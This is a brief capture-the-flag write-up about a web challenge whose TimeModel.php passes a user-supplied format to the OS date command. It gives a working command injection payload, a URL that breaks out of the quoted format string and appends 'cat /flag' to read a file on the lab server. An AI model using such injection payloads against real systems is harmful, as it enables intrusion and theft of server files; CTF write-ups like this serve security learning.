this one is very easy since you get the source code

in the `TimeModel.php` file i saw that the time is printed using the os date command. LOL

basically means os command injection.

i used that payload
`http://154.57.164.82:32680/?format=%H:%M:%S%27;%20cat%20/flag%27`
